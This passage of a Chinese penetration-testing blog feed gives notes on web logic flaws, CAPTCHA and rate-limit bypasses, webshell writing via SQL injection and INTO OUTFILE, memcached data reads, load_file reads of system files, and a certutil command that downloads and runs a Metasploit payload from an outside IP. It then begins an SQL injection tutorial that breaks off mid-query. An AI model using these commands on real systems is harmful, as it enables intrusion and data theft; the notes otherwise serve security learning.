(广域网中TTL为65-128)</p><p>Linux/Unix64(广域网中TTL为1-64)</p></li><li><p>大小写</p><p>Linux系统对大小写敏感</p><p>window系统对大小写不敏感</p></li></ul><h5 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h5><p>goby批量信息收集</p><p>w8fuckcdn 通过扫描全网绕过CDN获取网站IP地址</p><h4 id="网站CMS"><a href="#网站CMS" class="headerlink" title="网站CMS"></a>网站CMS</h4><h5 id="owasp-top-10漏洞挖掘"><a href="#owasp-top-10漏洞挖掘" class="headerlink" title="owasp top 10漏洞挖掘"></a>owasp top 10漏洞挖掘</h5><ul><li><p>sql注入漏洞</p></li><li><p>逻辑漏洞</p><p>支付漏洞</p><ul><li><p>任意金额修改</p><p>利用：抓包直接修改金额，可减少支付金额，也可修改为负的金额。</p><p>防御：</p><p>1、将商品ID和订单金额进行哈希加密，当用户修改金额之后再一次进行哈希加密并与原本的哈希值进行比较。</p><p>2、敏感参数不要放在url中。</p></li><li><p>请求重放</p><p>利用：</p><p>购买成功后，重放其中请求，竟然可以使购买商品一直增加。</p></li></ul><p>cookie缺陷</p><ul><li>token可以获取(前端爬虫)</li><li>cookie重复利用</li><li>cookie可枚举</li><li>cookie使用简单的加密算法</li></ul><p>验证码漏洞</p><ul><li><p>验证码绕过</p><p>原因：直接让验证码参数值为空，或者直接删掉验证码参数名，可导致绕过。</p></li><li><p>验证码回显</p><p>原因：验证码由前端即客户端生成，可在请求包中直接获取验证码。比如，前端源码、cookie中存在验证码。</p><p>利用：利用脚本提取验证码，直接暴力破解。</p><p>防御：</p><p>1、后端生成验证码。</p></li><li><p>验证码重复利用与验证码暴力破解</p></li><li><p>绕过防暴力破解</p><ul><li><p>限制IP</p><p>X-Forwarded-For绕过</p><p>在请求包中增加XFF报头即可，然后使用burp并将其也设置为一个intruder payload即可。</p></li><li><p>服务端只对失败次数进行了校验，当登录成功之后失败次数清0.</p><p>注册一个用户，将注册的用户(知道密码，成功登录之后会清零登录限制次数)与要暴力破解的用户放在一起。比如：正常用户steady，其他测试用户boy、sadjh、sadkh。可以生成一下字典：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">steady</span><br><span class="line">  boy</span><br><span class="line">  boy</span><br><span class="line">  sadjh</span><br><span class="line">  steady</span><br><span class="line">  steady</span><br><span class="line">  boy</span><br><span class="line">  boy</span><br><span class="line">  sadjh</span><br><span class="line">  steady</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>越权漏洞</p><ul><li>水平越权与垂直越权</li></ul><p>密码找回漏洞</p><ul><li><p>sql注入漏洞</p></li><li><p>某些字符标志可以组成url直接跳过验证</p></li><li><p>修改响应包</p><p>发送请求包，然后让响应包作为请求包，修改其中的敏感信息，然后再次发包。</p></li><li><p>跳过验证步骤(常见参数step)</p><ul><li>修改某些参数，可跳过认证步骤。</li></ul></li><li><p>替换用户账号或用户表示(uid、手机号、账号)</p><ul><li>两个账户测试，先使用一个账户B找回，然后把账号修改为A，最终成功修改A的账号。也可以直接复制数据包，只修改某些用户表示。</li></ul></li><li><p>删除某些参数可直接绕过验证</p></li><li><p>用户凭证在返回包中</p><ul><li>用户发送请求包，可以直接看到token信息、验证码</li></ul></li></ul></li></ul><h5 id="常见GetShell方式"><a href="#常见GetShell方式" class="headerlink" title="常见GetShell方式"></a>常见GetShell方式</h5><h6 id="owasp-top-10漏洞拿shell"><a href="#owasp-top-10漏洞拿shell" class="headerlink" title="owasp top 10漏洞拿shell"></a>owasp top 10漏洞拿shell</h6><ul><li><p>sql注入拿shell</p><ul><li><p>sqlmap –os-shell</p></li><li><p>sql注入漏洞直接写入shell</p><p>联合注入、报错注入、堆叠注入</p></li><li><p>日志文件拿shell(可以配合堆叠注入)</p></li><li><p>sqlmap –sql-shell 能够执行sql语句之后，在写shell</p></li></ul></li><li><p>phpadmin拿shell</p><ul><li>日志文件拿shell</li><li>直接执行sql语句那shell</li></ul></li><li><p>命令执行拿shell</p><ul><li>直接写shell到目标文件夹下面</li><li>执行系统命令、调用脚本语言反弹shell</li></ul></li><li><p>文件上传拿shell</p><ul><li>直接上传shell文件</li><li>上传一个具有写shell功能的文件，访问文件直接写入shell</li><li>上传一个具有命令执行的文件，然后执行命令写shell</li></ul></li><li><p>文件包含漏洞拿shell</p><ul><li>远程包含文件，将shell写入站点。</li><li>包含session文件</li><li>phpinfo本地包含临时文件</li></ul></li></ul><h6 id="网站功能点上传shell"><a href="#网站功能点上传shell" class="headerlink" title="网站功能点上传shell"></a>网站功能点上传shell</h6><ul><li><p>后台上传插件拿shell</p></li><li><p>后台数据库备份拿shell</p><p>数据库备份拿shell就是把我们sql语句放入数据库备份文件中,然后上传到服务器,服务器执行sql数据库备份文件进而执行我们的sql语句 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;一句话&quot; into outfile “路径”</span><br></pre></td></tr></table></figure><p>这里的路径一定要是全路径,不能只是一个文件名,如果只写相对路径或者文件名,文件会存储到服务器中的mysql所在的文件夹中</p></li><li><p>后台编辑前台模版文件拿shell</p></li><li><p>其他漏洞挖掘方式</p><ul><li><code>www.xxx.com\www.xxx.com.zip|rar</code>直接拖源码</li></ul></li></ul><h5 id="常见端口利用"><a href="#常见端口利用" class="headerlink" title="常见端口利用"></a>常见端口利用</h5><h6 id="11211端口–memcache"><a href="#11211端口–memcache" class="headerlink" title="11211端口–memcache"></a>11211端口–memcache</h6><p>漏洞介绍</p><p>Memcached 是一套常用的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公网开放的 Memcache 服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。</p><p>漏洞利用</p><p>telnet直接连接目标端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet xx.xx.xx.xx 11211</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ telnet ip 11211</span><br><span class="line">Trying ip...</span><br><span class="line">Connected to ip.</span><br><span class="line">Escape character is &#39;^]&#39;.</span><br></pre></td></tr></table></figure><p>nmap扫描</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV  -p 端口 --script memcached-info IP</span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-11-16 17:56 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> ip</span><br><span class="line">Host is up (<span class="number">0.54</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE   VERSION</span><br><span class="line"><span class="number">11211</span>/tcp open  memcached Memcached <span class="number">1.4</span><span class="number">.13</span> (uptime <span class="number">27164261</span> seconds)</span><br><span class="line">| memcached-info:</span><br><span class="line">|   Process ID: <span class="number">1121</span></span><br><span class="line">|   Uptime: <span class="number">27164262</span> seconds</span><br><span class="line">|   Server time: <span class="number">2020</span><span class="number">-11</span><span class="number">-16</span>T09:<span class="number">43</span>:<span class="number">25</span></span><br><span class="line">|   Architecture: <span class="number">64</span> bit</span><br><span class="line">|   Used CPU (user): <span class="number">1792.059996</span></span><br><span class="line">|   Used CPU (system): <span class="number">2583.961487</span></span><br><span class="line">|   Current connections: <span class="number">7</span></span><br><span class="line">|   Total connections: <span class="number">8070135</span></span><br><span class="line">|   Maximum connections: <span class="number">1024</span></span><br><span class="line">|   TCP Port: <span class="number">11211</span></span><br><span class="line">|   UDP Port: <span class="number">0</span></span><br><span class="line">|_  Authentication: no</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">15.20</span> seconds</span><br></pre></td></tr></table></figure><p>常用指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stats &#x2F;&#x2F;查看memcache 服务状态 </span><br><span class="line">stats items &#x2F;&#x2F;查看所有items </span><br><span class="line">stats cachedump 32 0 &#x2F;&#x2F;获得缓存key </span><br><span class="line">get :state:264861539228401373:261588 &#x2F;&#x2F;通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</span><br></pre></td></tr></table></figure><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><h4 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h4><h5 id="从web入口"><a href="#从web入口" class="headerlink" title="从web入口"></a>从web入口</h5><p>通过web入口可以通过web漏洞getshell，getshell之后获取数据库配置文件、对数据库内容进行分析，主要找到数据库ip。</p><h5 id="从数据库入口渗透"><a href="#从数据库入口渗透" class="headerlink" title="从数据库入口渗透"></a>从数据库入口渗透</h5><p>获取数据库账号、密码</p><p>在mysql中可以查看用户正在运行的线程，进而得到数据库ip地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.processlist</span><br></pre></td></tr></table></figure><p>在mssql中是否判断站酷分离</p><p>获取客户端主机名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host_name();</span><br></pre></td></tr></table></figure><p>获取服务端主机名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@servername;</span><br></pre></td></tr></table></figure><p>如果客户端主机名和服务端主机名一直则是同站同数据库，如果不是则是站库分离。</p><h5 id="站库分离的判断方法"><a href="#站库分离的判断方法" class="headerlink" title="站库分离的判断方法"></a>站库分离的判断方法</h5><h6 id="查看网络连接状态"><a href="#查看网络连接状态" class="headerlink" title="查看网络连接状态"></a>查看网络连接状态</h6><p>通过Netstat命令查看MSSQL数据库1433端口的网络连接状态，可以看到与当前MSSQL数据库服务器192.168.32.8建立连接的只有192.168.32.3，由此可以判断这台主机为Web服务器，并且站库分离。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr &quot;1433&quot;</span><br></pre></td></tr></table></figure><h6 id="查看当前服务器的IP"><a href="#查看当前服务器的IP" class="headerlink" title="查看当前服务器的IP"></a>查看当前服务器的IP</h6><p>数据库配置文件</p><p>通过网站程序数据库配置文件来判断是否站库分离，如果数据库IP地址是localhost、127.0.0.1或当前主机内网IP则说明为同服务器，反之则可能为站库分离。</p><p>MySQL内置函数和库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@hostname;                                 &#x2F;&#x2F;服务端主机名称</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.PROCESSLIST;      &#x2F;&#x2F;客户端主机名称和端口</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201110222106564.png" alt="image-20201110222106564"></p><p>MSSQL注入语句</p><p>执行下面语句，如果页面正常回显，说明<code>host_name()=@@servername</code>即数据库服务端主机名称与数据库客户端主机名称一样，说明站库不分离。否则站库分离。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(select * from news where 1&#x3D;(SELECT (case when host_name()&#x3D;@@servername then 1 else 0 end)))</span><br></pre></td></tr></table></figure><p>MSSQL内置函数和表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select host_name();                       &#x2F;&#x2F;客户端主机名称</span><br><span class="line">select @@servername;                      &#x2F;&#x2F;服务端主机名称</span><br><span class="line">select serverproperty(&#39;MachineName&#39;);     &#x2F;&#x2F;服务端主机名称</span><br></pre></td></tr></table></figure><p>其他配置文件</p><p>通过load_file()这个内置函数读取一些敏感文件，hosts文件、IIS/Apache/Nginx/Tomcat/Jboss/Weblogic/Websphere的相关配置文件以及网卡信息等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;C:&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts&#39;);</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;70-persistent-net.rules          &#x2F;&#x2F;获取网卡名称</span><br><span class="line">&#x2F;etc&#x2F;network&#x2F;interfaces                            &#x2F;&#x2F;DHCP或静态IP</span><br></pre></td></tr></table></figure><h5 id="站库分离利用思路"><a href="#站库分离利用思路" class="headerlink" title="站库分离利用思路"></a>站库分离利用思路</h5><p>下载远程木马文件</p><p>目标主机允许通外网时我们可以利用Vbs/Ftp/IPC$/Certutil/Bitsadmin/Powershell等方式来下载远程文件到可读写目录中，然后再去执行一下即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;155.**.***.229:8888&#x2F;msf.exe C:\ProgramData\msf.exe</span><br><span class="line">C:\ProgramData\msf.exe</span><br></pre></td></tr></table></figure><p>使用metasploit模块</p><p>在数据库服务器中，没有web服务我们无法上传webshell，比如上传php、jsp、aspx等文件到目标服务器，执行webshell进而拿到shell。这时候我们可以使用msf的模块，该模块监听一个端口，但是不是生成一个exe木马，或者是一个编程语言的webshell，而是利用对方主机能够执行命令的特点，来获取一个shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Metasploit下的exploit&#x2F;multi&#x2F;script&#x2F;web_delivery和exploit&#x2F;windows&#x2F;misc&#x2F;hta_server两个模块来执行远程Payload获取会话</span><br></pre></td></tr></table></figure><p>模拟令牌权限提升</p><p>通过Incognito扩展中的模拟令牌功能获取到数据库服务器的Admin/SYSTEM令牌。</p><p>通过Windows身份验证，使用数据库连接工具，比如sqlcmd、SSMS和Navicat Premium等。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;一个网站的渗透思路&quot;&gt;&lt;a href=&quot;#一个网站的渗透思路&quot; class=&quot;headerlink&quot; title=&quot;一个网站的渗透思路&quot;&gt;&lt;/a&gt;一个网站的渗透思路&lt;/h3&gt;&lt;h4 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL--SQL注入漏洞</title>
    <link href="http://s1eady.top/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://s1eady.top/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-22T14:46:26.000Z</published>
    <updated>2020-11-10T07:51:52.387Z</updated>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当前数据库用户、数据库中的表等信息，也可以读取敏感文件、写入服务器shell，进而获取主机权限。</p><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>MySQL 5.0以上版本。</p><p>数据库</p><ul><li><p><strong>information_schema</strong></p><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息。</p></li></ul><p>表</p><ul><li><p><strong>SCHEMATA</strong></p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等。</p></li><li><p><strong>TABLES</strong></p><p>提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。</p></li><li><p><strong>COLUMNS</strong></p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use information_schema;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table <span class="keyword">and</span> column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| Tables_in_information_schema          |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| TABLES                                |</span><br><span class="line">| SCHEMATA                              |</span><br><span class="line">| COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="line">| COLUMNS                               |</span><br><span class="line">mysql&gt; desc TABLES;</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field           | Type                | Null | Key | Default | Extra |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG   | varchar(<span class="number">512</span>)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA    | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME      | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_TYPE      | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| ENGINE          | varchar(<span class="number">64</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| VERSION         | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| ROW_FORMAT      | varchar(<span class="number">10</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_ROWS      | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AVG_ROW_LENGTH  | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_LENGTH     | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| MAX_DATA_LENGTH | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| INDEX_LENGTH    | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_FREE       | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AUTO_INCREMENT  | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| UPDATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| CHECK_TIME      | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COLLATION | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| CHECKSUM        | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_OPTIONS  | varchar(<span class="number">255</span>)        | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COMMENT   | varchar(<span class="number">2048</span>)       | NO   |     |         |       |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">mysql&gt; desc COLUMNS;</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field                    | Type                | Null | Key | Default | Extra |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG            | varchar(<span class="number">512</span>)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA             | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME               | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_NAME              | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| ORDINAL_POSITION         | bigint(<span class="number">21</span>) unsigned | NO   |     | <span class="number">0</span>       |       |</span><br><span class="line">| COLUMN_DEFAULT           | longtext            | YES  |     | NULL    |       |</span><br><span class="line">| IS_NULLABLE              | varchar(<span class="number">3</span>)          | NO   |     |         |       |</span><br><span class="line">| DATA_TYPE                | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| CHARACTER_MAXIMUM_LENGTH | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CHARACTER_OCTET_LENGTH   | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| NUMERIC_PRECISION        | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| NUMERIC_SCALE            | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATETIME_PRECISION       | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CHARACTER_SET_NAME       | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| COLLATION_NAME           | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| COLUMN_TYPE              | longtext            | NO   |     | NULL    |       |</span><br><span class="line">| COLUMN_KEY               | varchar(<span class="number">3</span>)          | NO   |     |         |       |</span><br><span class="line">| EXTRA                    | varchar(<span class="number">30</span>)         | NO   |     |         |       |</span><br><span class="line">| PRIVILEGES               | varchar(<span class="number">80</span>)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_COMMENT           | varchar(<span class="number">1024</span>)       | NO   |     |         |       |</span><br><span class="line">| GENERATION_EXPRESSION    | longtext            | NO   |     | NULL    |       |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line"><span class="number">21</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li></ul><p>总结</p><p>MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">information_schema的表schemata中的列schema_name记录了所有数据库的名字</span><br><span class="line">information_schema的表tables中的列table_schema记录了所有数据库的名字</span><br><span class="line">information_schema的表tables中的列table_name记录了所有数据库的表的名字</span><br><span class="line">information_schema的表columns中的列table_schema记录了所有数据库的名字</span><br><span class="line">information_schema的表columns中的列table_name记录了所有数据库的表的名字</span><br><span class="line">information_schema的表columns中的列column_name记录了所有数据库的表的列的名字</span><br></pre></td></tr></table></figure><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><h5 id="right、left函数"><a href="#right、left函数" class="headerlink" title="right、left函数"></a>right、left函数</h5><p><code>LEFT()</code>函数是一个字符串函数,它返回具有指定长度的字符串的左边部分，<strong>我们在注入的时候，前台可能会限制回显字段，这时候我们可以使用这两个函数</strong>。</p><p>right同理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| <span class="number">67890</span>                 |</span><br><span class="line">+-----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">2</span>) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| <span class="number">90</span>                    |</span><br><span class="line">+-----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select left(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+----------------------+</span><br><span class="line">| left(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+----------------------+</span><br><span class="line">| <span class="number">12345</span>                |</span><br><span class="line">+----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h5 id="isnull-exp"><a href="#isnull-exp" class="headerlink" title="isnull(exp)"></a>isnull(exp)</h5><p>如果exp为null返回1，否侧返回0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select isnull(<span class="number">1</span>+<span class="number">1</span>);</span><br><span class="line">+-------------+</span><br><span class="line">| isnull(<span class="number">1</span>+<span class="number">1</span>) |</span><br><span class="line">+-------------+</span><br><span class="line">|           <span class="number">0</span> |</span><br><span class="line">+-------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select isnull(<span class="number">0</span>);</span><br><span class="line">+-----------+</span><br><span class="line">| isnull(<span class="number">0</span>) |</span><br><span class="line">+-----------+</span><br><span class="line">|         <span class="number">0</span> |</span><br><span class="line">+-----------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>可以配合注入来判断文件是否存在以及是否有权限读取文件。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> math where 